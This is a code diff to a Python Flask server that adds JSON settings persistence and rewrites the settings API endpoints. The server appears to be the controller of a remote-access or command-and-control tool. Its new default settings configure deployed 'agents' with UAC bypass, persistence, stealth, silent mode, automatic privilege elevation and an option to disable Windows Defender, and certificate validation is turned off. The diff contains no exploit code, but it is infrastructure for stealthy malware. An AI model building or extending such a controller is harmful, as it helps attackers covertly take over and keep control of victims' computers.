@@ -71,6 +71,107 @@ CORS(app, origins=allowed_origins,
 # Use eventlet (matches Procfile start command) or auto-detect if eventlet is available
 socketio = SocketIO(app, async_mode='threading', cors_allowed_origins=allowed_origins)
 
+# -----------------------------
+# Settings persistence (JSON)
+# -----------------------------
+SETTINGS_FILE_PATH = os.environ.get('SETTINGS_FILE_PATH', os.path.join(os.path.dirname(__file__), 'settings.json'))
+
+DEFAULT_SETTINGS = {
+    'server': {
+        'controllerUrl': f"http://{Config.HOST}:{Config.PORT}",
+        'serverPort': Config.PORT,
+        'sslEnabled': False,
+        'maxAgents': 100,
+        'heartbeatInterval': 30,
+        'commandTimeout': 30,
+        'autoReconnect': True,
+        'backupUrl': ''
+    },
+    'authentication': {
+        # Do NOT persist plaintext in production; kept here for parity with UI. Prefer env ADMIN_PASSWORD.
+        'operatorPassword': '',
+        'sessionTimeout': 30,
+        'maxLoginAttempts': 3,
+        'requireTwoFactor': False,
+        'apiKeyEnabled': True,
+        'apiKey': ''
+    },
+    'email': {
+        'enabled': False,
+        'smtpServer': 'smtp.gmail.com',
+        'smtpPort': 587,
+        'username': '',
+        'password': '',
+        'recipient': '',
+        'enableTLS': True,
+        'notifyAgentOnline': True,
+        'notifyAgentOffline': True,
+        'notifyCommandFailure': True,
+        'notifySecurityAlert': True
+    },
+    'agent': {
+        'defaultPersistence': True,
+        'enableUACBypass': True,
+        'enableDefenderDisable': False,
+        'enableAdvancedPersistence': True,
+        'silentMode': True,
+        'quickStartup': False,
+        'enableStealth': True,
+        'autoElevatePrivileges': True
+    },
+    'webrtc': {
+        'enabled': True,
+        'iceServers': [
+            'stun:stun.l.google.com:19302',
+            'stun:stun1.l.google.com:19302'
+        ],
+        'maxBitrate': 5000000,
+        'adaptiveBitrate': True,
+        'frameDropping': True,
+        'qualityLevel': 'auto',
+        'monitoringEnabled': True
+    },
+    'security': {
+        'encryptCommunication': True,
+        'validateCertificates': False,
+        'allowSelfSigned': True,
+        'rateLimitEnabled': True,
+        'rateLimitRequests': 100,
+        'rateLimitWindow': 60,
+        # Allow configuring additional CORS origins from UI
+        'frontendOrigins': []
+    }
+}
+
+def _deep_update(original: dict, updates: dict) -> dict:
+    for key, value in updates.items():
+        if isinstance(value, dict) and isinstance(original.get(key), dict):
+            _deep_update(original[key], value)
+        else:
+            original[key] = value
+    return original
+
+def load_settings() -> dict:
+    try:
+        if os.path.exists(SETTINGS_FILE_PATH):
+            with open(SETTINGS_FILE_PATH, 'r') as f:
+                data = json.load(f)
+            # Merge with defaults to ensure missing keys are present
+            merged = json.loads(json.dumps(DEFAULT_SETTINGS))
+            return _deep_update(merged, data)
+    except Exception as e:
+        print(f"Failed to load settings.json: {e}")
+    return json.loads(json.dumps(DEFAULT_SETTINGS))
+
+def save_settings(data: dict) -> bool:
+    try:
+        with open(SETTINGS_FILE_PATH, 'w') as f:
+            json.dump(data, f, indent=2)
+        return True
+    except Exception as e:
+        print(f"Failed to save settings.json: {e}")
+        return False
+
 # WebRTC Configuration
 WEBRTC_CONFIG = {
     'enabled': WEBRTC_AVAILABLE,
@@ -2410,76 +2511,46 @@ def search_agents():
 @app.route('/api/settings', methods=['GET'])
 @require_auth
 def get_settings():
-    """Get current system settings"""
-    settings = {
-        'server': {
-            'host': Config.HOST,
-            'port': Config.PORT,
-            'session_timeout': Config.SESSION_TIMEOUT,
-            'max_login_attempts': Config.MAX_LOGIN_ATTEMPTS,
-            'login_timeout': Config.LOGIN_TIMEOUT
-        },
-        'security': {
-            'salt_length': Config.SALT_LENGTH,
-            'hash_iterations': Config.HASH_ITERATIONS
-        },
-        'webrtc': {
-            'enabled': WEBRTC_CONFIG['enabled'],
-            'ice_servers': WEBRTC_CONFIG['ice_servers'],
-            'quality_levels': WEBRTC_CONFIG['quality_levels'],
-            'performance_tuning': WEBRTC_CONFIG['performance_tuning']
-        },
-        'monitoring': {
-            'connection_quality_metrics': WEBRTC_CONFIG['monitoring']['connection_quality_metrics'],
-            'automatic_reconnection': WEBRTC_CONFIG['monitoring']['automatic_reconnection'],
-            'stats_interval': WEBRTC_CONFIG['monitoring']['stats_interval']
-        }
-    }
-    
-    return jsonify(settings)
+    """Get current system settings (merged with defaults)."""
+    current = load_settings()
+    return jsonify(current)
 
 @app.route('/api/settings', methods=['POST'])
 @require_auth
 def update_settings():
-    """Update system settings"""
+    """Update system settings and persist to settings.json. Some changes may need restart."""
     if not request.is_json:
         return jsonify({'error': 'JSON payload required'}), 400
-    
-    settings = request.json
-    updated_settings = []
-    
-    # Update WebRTC settings if provided
-    if 'webrtc' in settings:
-        webrtc_settings = settings['webrtc']
-        if 'quality_levels' in webrtc_settings:
-            WEBRTC_CONFIG['quality_levels'].update(webrtc_settings['quality_levels'])
-            updated_settings.append('webrtc.quality_levels')
-        
-        if 'performance_tuning' in webrtc_settings:
-            WEBRTC_CONFIG['performance_tuning'].update(webrtc_settings['performance_tuning'])
-            updated_settings.append('webrtc.performance_tuning')
-        
-        if 'monitoring' in webrtc_settings:
-            WEBRTC_CONFIG['monitoring'].update(webrtc_settings['monitoring'])
-            updated_settings.append('webrtc.monitoring')
-    
-    # Note: Some settings like server config require restart to take effect
-    return jsonify({
-        'success': True,
-        'updated_settings': updated_settings,
-        'message': 'Settings updated successfully. Some changes may require restart.'
-    })
+    incoming = request.json
+    current = load_settings()
+    updated = _deep_update(current, incoming)
+    if not save_settings(updated):
+        return jsonify({'success': False, 'message': 'Failed to save settings'}), 500
+
+    # Apply a subset live where safe (e.g., WebRTC toggles)
+    try:
+        if 'webrtc' in incoming:
+            webrtc = incoming['webrtc']
+            if 'enabled' in webrtc:
+                WEBRTC_CONFIG['enabled'] = bool(webrtc['enabled'])
+            if 'iceServers' in webrtc:
+                WEBRTC_CONFIG['ice_servers'] = webrtc['iceServers']
+    except Exception as e:
+        print(f"Warning applying live settings: {e}")
+
+    return jsonify({'success': True, 'message': 'Settings saved. Some changes may require restart.'})
 
 @app.route('/api/settings/reset', methods=['POST'])
 @require_auth
 def reset_settings():
     """Reset settings to default values"""
-    # This would reset WEBRTC_CONFIG to defaults
-    # For now, just return success
-    return jsonify({
-        'success': True,
-        'message': 'Settings reset to defaults'
-    })
+    defaults = json.loads(json.dumps(DEFAULT_SETTINGS))
+    if not save_settings(defaults):
+        return jsonify({'success': False, 'message': 'Failed to reset settings'}), 500
+    # Apply a safe subset immediately
+    WEBRTC_CONFIG['enabled'] = defaults['webrtc']['enabled']
+    WEBRTC_CONFIG['ice_servers'] = defaults['webrtc']['iceServers']
+    return jsonify({'success': True, 'message': 'Settings reset to defaults'})
 
 # System Information API
 @app.route('/api/system/info', methods=['GET'])
